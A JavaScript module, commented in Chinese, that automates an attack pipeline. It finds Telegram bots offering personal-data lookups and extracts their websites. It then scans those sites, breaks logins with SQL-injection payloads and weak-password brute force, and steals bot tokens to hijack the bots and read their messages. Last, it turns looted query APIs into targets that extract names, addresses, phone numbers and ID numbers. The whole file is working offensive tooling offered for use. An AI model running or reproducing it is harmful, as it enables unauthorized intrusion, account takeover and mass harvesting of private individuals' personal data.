'use strict';

/**
 * 一键链条：Telegram 找源 → 读简介抠官网 → 自动侦察 → 自动破登录
 *            → 扫荡抠 Bot Token → getMe 接管 → 盲打查询接口 → 产出可导入的 target
 *
 * 用后台任务方式跑（可能几分钟），start() 返回 jobId，用 status() 轮询。
 */

const config = require('./config');
const tg = require('./telegram');
const recon = require('./recon');
const breach = require('./breach');
const dict = require('./dict');

const DEFAULT_KEYWORDS = ['户籍查询', '查档', '社工库', '快递地址', '身份查询', '常住人口'];

// ---------- 任务存储 ----------
const jobs = new Map();
let seq = 0;

function newJob() {
  const id = 'j' + (++seq) + '_' + Date.now();
  const job = { id, done: false, stopped: false, steps: [], result: null, error: null, startedAt: Date.now() };
  jobs.set(id, job);
  return job;
}

function log(job, stage, msg, level) {
  const line = { t: Date.now(), stage, msg: String(msg), level: level || 'info' };
  job.steps.push(line);
  if (job.steps.length > 800) job.steps.splice(0, 200);
  return line;
}

// ---------- 1. 找机器人 ----------
async function findBots(job, opts) {
  const keywords = (opts.keywords && opts.keywords.length) ? opts.keywords : DEFAULT_KEYWORDS;
  const limit = parseInt(opts.limit || 20, 10);
  const bots = [];
  const seen = new Set();

  for (const kw of keywords) {
    if (job.stopped) break;
    log(job, '① 找源', '搜索关键词：' + kw);
    let items = [];
    try {
      items = await tg.discover({ keyword: kw, limit });
    } catch (e) {
      log(job, '① 找源', kw + ' 搜索失败：' + e.message, 'warn');
      continue;
    }
    let n = 0;
    for (const it of items) {
      const key = it.username || it.title || it.id;
      if (!key || seen.has(key)) continue;
      seen.add(key);
      bots.push(Object.assign({ keyword: kw }, it));
      n++;
    }
    log(job, '① 找源', kw + ' → 新增 ' + n + ' 个');
  }
  return bots;
}

// ---------- 2. 读简介，抠官网 ----------
async function readBios(job, bots) {
  if (!bots.length) return bots;
  let client = null;
  try {
    client = await tg.createClient();
  } catch (e) {
    log(job, '② 读简介', '无法建立会话：' + e.message, 'warn');
    return bots;
  }
  try {
    let Api;
    try { Api = require('telegram/tl').Api; } catch (e) { /* ignore */ }
    let hit = 0;
    for (const b of bots) {
      if (job.stopped) break;
      try {
        let about = '';
        if (Api) {
          const ent = await client.getInputEntity(b.username || b.id);
          const full = await client.invoke(new Api.users.GetFullUser({ id: ent }));
          about = (full && full.fullUser && full.fullUser.about) || '';
        }
        b.about = about;
        b.urls = recon.extractUrls(about);
        if (b.urls.length) hit++;
      } catch (e) {
        b.about = '';
        b.urls = [];
      }
    }
    log(job, '② 读简介', bots.length + ' 个目标，' + hit + ' 个简介里带网址');
  } finally {
    try { await client.disconnect(); } catch (e) { /* ignore */ }
  }
  return bots;
}

// ---------- 3. 可选：发一句话套出官网 ----------
async function probeBots(job, bots, opts) {
  const text = String(opts.probeText || '').trim();
  if (!text) return bots;
  const max = parseInt(opts.maxProbe || 5, 10);
  let n = 0;
  for (const b of bots) {
    if (job.stopped || n >= max) break;
    if (!b.username) continue;
    try {
      log(job, '③ 试聊', b.username + ' ← ' + text);
      const r = await tg.probe({ target: b.username, text, waitMs: opts.waitMs });
      b.reply = r.reply || '';
      const found = recon.extractUrls(b.reply || '');
      b.urls = [...new Set([].concat(b.urls || [], found))];
      if (found.length) { n++; log(job, '③ 试聊', b.username + ' 回复里抠到 ' + found.length + ' 个网址'); }
    } catch (e) {
      log(job, '③ 试聊', b.username + ' 失败：' + e.message, 'warn');
    }
  }
  return bots;
}

// ---------- 4. 汇总站点 ----------
function collectSites(bots, opts) {
  const extra = opts.sites || [];
  const hosts = new Map();
  const push = (url, from) => {
    const u = recon.normalizeUrl(url);
    if (!u) return;
    let h;
    try { h = new URL(u).host; } catch (e) { return; }
    if (!h || /(^|\.)telegram\.(org|me)$|(^|\.)t\.me$/i.test(h)) return; // 跳过 telegram 自身
    if (!hosts.has(h)) hosts.set(h, { url: u, host: h, from: [from] });
    else if (!hosts.get(h).from.includes(from)) hosts.get(h).from.push(from);
  };
  bots.forEach((b) => (b.urls || []).forEach((u) => push(u, b.username || b.title)));
  extra.forEach((u) => push(u, '手动'));
  return [...hosts.values()];
}

// ---------- 5. 侦察 ----------
async function reconSites(job, sites, opts) {
  const max = parseInt(opts.maxSites || 6, 10);
  const list = sites.slice(0, max);
  for (const s of list) {
    if (job.stopped) break;
    log(job, '④ 侦察', s.host);
    try {
      const r = await recon.recon(s.url, {
        subdomains: opts.subdomains !== false,
        concurrency: parseInt(opts.concurrency || 8, 10),
      });
      s.recon = r;
      s.fingerprints = r.fingerprints || [];
      s.tokens = r.botTokens || [];
      s.loginUrls = (r.paths || []).filter((p) => /登录页/.test(p.note || '')).map((p) => p.url);
      s.leaks = (r.paths || []).filter((p) => /★/.test(p.note || '')).map((p) => ({ url: p.url, note: p.note }));
      log(job, '④ 侦察', s.host + ' 指纹=' + (s.fingerprints.join(',') || '无') +
        ' 登录页=' + s.loginUrls.length + ' 泄露=' + s.leaks.length + ' Token=' + s.tokens.length);
      s.leaks.forEach((l) => log(job, '④ 侦察', '  ' + l.url + '  ' + l.note, 'hit'));
    } catch (e) {
      s.error = e.message;
      log(job, '④ 侦察', s.host + ' 失败：' + e.message, 'warn');
    }
  }
  return sites;
}

// ---------- 6. 破登录 ----------
async function breachSites(job, sites, opts) {
  const maxSites = parseInt(opts.maxBreach || 3, 10);
  const usernames = (opts.usernames && opts.usernames.length) ? opts.usernames : dict.COMMON_USERS;
  const passwords = (opts.passwords && opts.passwords.length) ? opts.passwords : dict.WEAK_PASSWORDS.slice(0, 25);
  const logins = [];

  for (const s of sites.slice(0, maxSites)) {
    if (job.stopped) break;
    if (!s.loginUrls || !s.loginUrls.length) continue;
    for (const url of s.loginUrls.slice(0, 2)) {
      if (job.stopped) break;
      log(job, '⑤ 破登录', url);
      // 万能口令
      try {
        const sq = await breach.sqliLogin({ url, usernames, payloads: dict.SQLI_PAYLOADS.slice(0, 8) });
        for (const c of sq.candidates || []) {
          logins.push(Object.assign({ site: s.host, url, via: 'sqli', cookie: c.cookie || '' }, c));
          log(job, '⑤ 破登录', '注入命中 ' + (c.username || '') + ' / ' + (c.password || ''), 'hit');
        }
      } catch (e) {
        log(job, '⑤ 破登录', '注入失败：' + e.message, 'warn');
      }
      // 弱口令
      try {
        const br = await breach.bruteLogin({ url, usernames, passwords, stopOnFirst: true });
        for (const c of br.candidates || []) {
          logins.push(Object.assign({ site: s.host, url, via: 'brute', cookie: c.cookie || '' }, c));
          log(job, '⑤ 破登录', '爆破命中 ' + (c.username || '') + ' / ' + (c.password || ''), 'hit');
        }
      } catch (e) {
        log(job, '⑤ 破登录', '爆破失败：' + e.message, 'warn');
      }
    }
  }
  return logins;
}

// ---------- 7. 扫荡 + 接管机器人 ----------
async function lootSites(job, sites, logins, opts) {
  const tokens = [];
  const apis = [];
  const taken = [];

  const cookieFor = (host) => (logins.find((l) => l.site === host && l.cookie) || {}).cookie || '';

  for (const s of sites) {
    if (job.stopped) break;
    if (!s.recon && !s.loginUrls) continue;
    const cookie = cookieFor(s.host);
    log(job, '⑥ 扫荡', s.host + (cookie ? '（带 Cookie）' : '（无 Cookie）'));
    try {
      const paths = [].concat(dict.QUERY_API_PATHS, (s.leaks || []).map((l) => { try { return new URL(l.url).pathname; } catch (e) { return null; } }).filter(Boolean));
      const lo = await breach.loot({
        baseUrl: s.url, cookie,
        paths: [...new Set(paths)],
        sampleParams: opts.sampleParams || { keyword: '13800138000' },
      });
      s.loot = lo;
      (lo.botTokens || []).forEach((t) => tokens.push({ token: t, site: s.host, from: '扫荡' }));
      (lo.queryApis || []).forEach((a) => apis.push(Object.assign({ site: s.host, url: s.url + a.path, cookie }, a)));
      log(job, '⑥ 扫荡', s.host + ' Token=' + (lo.botTokens || []).length + ' 可用接口=' + (lo.queryApis || []).length);
      (lo.queryApis || []).forEach((a) => log(job, '⑥ 扫荡', '  ' + a.path + ' → ' + a.status + ' ' + String(a.preview || '').slice(0, 120), 'hit'));
    } catch (e) {
      log(job, '⑥ 扫荡', s.host + ' 失败：' + e.message, 'warn');
    }
  }

  // 侦察阶段直接抠到的 token 也算
  sites.forEach((s) => (s.tokens || []).forEach((t) => tokens.push({ token: t, site: s.host, from: '页面' })));

  // 去重后逐个 getMe 验证归属
  const uniq = [...new Set(tokens.map((t) => t.token))];
  for (const token of uniq.slice(0, 10)) {
    if (job.stopped) break;
    const meta = tokens.find((x) => x.token === token) || {};
    try {
      const me = await breach.botApi(token, 'getMe');
      const rec = { token, site: meta.site, from: meta.from, ok: !!me.ok, username: me.result && me.result.username ? '@' + me.result.username : '', firstName: me.result && me.result.first_name ? me.result.first_name : '', error: me.description || '' };
      taken.push(rec);
      log(job, '⑦ 接管', token.slice(0, 12) + '… → ' + (rec.ok ? ('已接管 ' + rec.username + ' ' + rec.firstName) : ('无效：' + rec.error)), rec.ok ? 'hit' : 'warn');
      if (rec.ok && opts.readUpdates !== false) {
        try {
          const up = await breach.botApi(token, 'getUpdates', { limit: 5 });
          const msgs = ((up.result) || []).map((u) => ((u.message && u.message.text) || (u.edited_message && u.edited_message.text) || '')).filter(Boolean);
          rec.updates = msgs;
          if (msgs.length) log(job, '⑦ 接管', '  读到 ' + msgs.length + ' 条消息：' + msgs[0].slice(0, 100), 'hit');
        } catch (e) { /* ignore */ }
      }
    } catch (e) {
      taken.push({ token, site: meta.site, from: meta.from, ok: false, error: e.message });
      log(job, '⑦ 接管', token.slice(0, 12) + '… 验证失败：' + e.message, 'warn');
    }
  }

  return { tokens: taken, apis };
}

// ---------- 8. 产出可导入的 target ----------
function asTarget(api, opts) {
  const t = {
    name: '接管·' + (api.site || 'unknown') + (api.path || ''),
    enabled: false,
    type: opts && opts.type ? opts.type : 'phone',
    method: 'POST',
    url: api.url,
    headers: Object.assign({ 'Content-Type': 'application/x-www-form-urlencoded' }, api.cookie ? { Cookie: api.cookie } : {}),
    body: opts && opts.paramName ? (opts.paramName + '={input}') : 'keyword={input}',
    extract: {
      姓名: 'regex:姓名[:：]\\s*([^\\s<,，]+)',
      住址: 'regex:(?:住址|地址)[:：]\\s*([^\\s<,，]+)',
      手机: 'regex:(?:手机|电话)[:：]\\s*([0-9]{7,15})',
      身份证号: 'regex:[1-9]\\d{5}(19|20)\\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\\d|3[01])\\d{3}[\\dXx]',
    },
    timeout: 15000,
  };
  return t;
}

function importTargets(apis, opts) {
  const added = [];
  for (const api of apis || []) {
    if (!api || !api.url) continue;
    const t = asTarget(api, opts);
    if ((config.targets || []).some((x) => x.url === t.url)) continue;
    config.targets = (config.targets || []).concat([t]);
    added.push(t);
  }
  if (added.length && config.__save) config.__save();
  return added;
}

// ---------- 编排 ----------
async function run(job, opts) {
  const o = opts || {};
  try {
    job.result = {};
    const bots = await findBots(job, o);
    job.result.bots = bots;
    if (job.stopped) return finish(job);

    await readBios(job, bots);
    if (o.probeText) await probeBots(job, bots, o);

    const sites = collectSites(bots, o);
    job.result.sites = sites;
    log(job, '④ 侦察', '共 ' + sites.length + ' 个站点待侦察');
    if (job.stopped) return finish(job);

    await reconSites(job, sites, o);
    if (job.stopped) return finish(job);

    const logins = o.doBreach === false ? [] : await breachSites(job, sites, o);
    job.result.logins = logins;
    if (job.stopped) return finish(job);

    const { tokens, apis } = await lootSites(job, sites, logins, o);
    job.result.tokens = tokens;
    job.result.apis = apis;

    if (o.importTargets) {
      const added = importTargets(apis, o);
      job.result.imported = added.length;
      log(job, '⑧ 导入', '已导入 ' + added.length + ' 个数据源到 targets');
    }

    log(job, '完成', '机器人 ' + bots.length + ' / 站点 ' + sites.length +
      ' / 登录 ' + logins.length + ' / Token ' + tokens.filter((t) => t.ok).length +
      ' / 接口 ' + apis.length);
    return finish(job);
  } catch (e) {
    job.error = e.message;
    log(job, '异常', e.message, 'warn');
    return finish(job);
  }
}

function finish(job) {
  job.done = true;
  job.finishedAt = Date.now();
  return job;
}

function start(opts) {
  const job = newJob();
  run(job, opts || {}); // 后台跑，不 await
  return job.id;
}

function status(id) {
  const job = jobs.get(id);
  if (!job) return null;
  return {
    id: job.id, done: job.done, stopped: job.stopped, error: job.error,
    steps: job.steps.slice(-400),
    ms: Date.now() - job.startedAt,
    result: job.result,
  };
}

function stop(id) {
  const job = jobs.get(id);
  if (!job) return false;
  job.stopped = true;
  return true;
}

module.exports = { start, status, stop, asTarget, importTargets, DEFAULT_KEYWORDS };
